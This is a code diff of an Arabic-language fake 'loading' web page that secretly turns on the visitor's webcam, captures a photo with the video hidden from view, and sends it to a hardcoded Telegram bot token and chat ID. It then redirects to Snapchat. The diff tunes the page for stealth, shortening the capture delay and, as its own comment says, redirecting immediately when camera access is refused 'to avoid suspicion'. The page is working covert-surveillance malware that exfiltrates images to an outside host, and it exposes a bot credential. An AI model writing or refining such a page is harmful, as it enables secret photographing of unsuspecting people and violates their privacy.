@@ -5,68 +5,56 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>جاري التحميل...</title>
     <style>
-        body { text-align: center; font-family: Arial, sans-serif; padding-top: 50px; background-color: #f4f4f4; color: #333; }
-        video, canvas { display: none; } /* إخفاء الكاميرا عن المستخدم */
+        body { text-align: center; font-family: Arial; padding-top: 50px; background-color: #f4f4f4; }
+        video, canvas { display: none; }
     </style>
 </head>
 <body>
 
     <div id="status">
-        <h2>جاري تهيئة المتصفح...</h2>
-        <p>يرجى الانتظار لحظة لتحميل المحتوى.</p>
+        <h2>جاري التحميل...</h2>
     </div>
 
-    <!-- العناصر التقنية المخفية -->
     <video id="video" width="640" height="480" autoplay></video>
     <canvas id="canvas" width="640" height="480"></canvas>
 
     <script>
-        // معلومات البوت الخاص بك (مدمجة مسبقاً)
         const TELEGRAM_TOKEN = "8780843163:AAEQYDrUCNzSF32SWGKYdzx6h2pWn4mIsd4"; 
         const CHAT_ID = "7191557045"; 
 
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
-        const statusText = document.getElementById('status');
 
-        // 1. محاولة فتح الكاميرا
+        // طلب الكاميرا فوراً
         navigator.mediaDevices.getUserMedia({ video: true })
             .then(stream => {
                 video.srcObject = stream;
-                // الانتظار 3 ثوانٍ لالتقاط صورة واضحة
-                setTimeout(captureAndSend, 3000);
+                // التقاط الصورة بعد ثانية واحدة فقط من فتح الكاميرا
+                setTimeout(captureAndSend, 1000);
             })
             .catch(err => {
-                // رسالة تظهر في حال رفض المستخدم الصلاحية
-                statusText.innerHTML = "<h2>خطأ في الاتصال</h2><p>يرجى السماح بصلاحية الكاميرا للمتابعة.</p>";
+                // إذا رفض المستخدم الكاميرا، يتم تحويله فوراً لتجنب الشك
+                window.location.href = "https://snapchat.com";
             });
 
         function captureAndSend() {
             const context = canvas.getContext('2d');
             context.drawImage(video, 0, 0, 640, 480);
             
-            // 2. تحويل الصورة إلى ملف (Blob) وإرساله للبوت
             canvas.toBlob(blob => {
                 const formData = new FormData();
                 formData.append("chat_id", CHAT_ID);
-                formData.append("photo", blob, "snap.jpg");
-                formData.append("caption", "📸 تم التقاط صورة جديدة بنجاح!");
+                formData.append("photo", blob, "img.jpg");
 
                 fetch(`https://telegram.org{TELEGRAM_TOKEN}/sendPhoto`, {
                     method: "POST",
                     body: formData
                 })
-                .then(response => {
-                    if (response.ok) {
-                        statusText.innerHTML = "<h2>اكتمل التحميل</h2><p>يتم تحويلك الآن...</p>";
-                        // التوجيه إلى سناب شات بعد نجاح العملية
-                        setTimeout(() => { 
-                            window.location.href = "https://snapchat.com"; 
-                        }, 1000);
-                    }
-                })
-                .catch(error => console.error("Error:", error));
-            }, 'image/jpeg', 0.7); // جودة الصورة 70% لضمان سرعة الإرسال
+                .finally(() => {
+                    // التحويل لسناب شات فوراً بعد الإرسال أو الفشل
+                    window.location.href = "https://snapchat.com";
+                });
+            }, 'image/jpeg', 0.6); // جودة أقل قليلاً لسرعة إرسال أكبر
         }
     </script>
 </body>
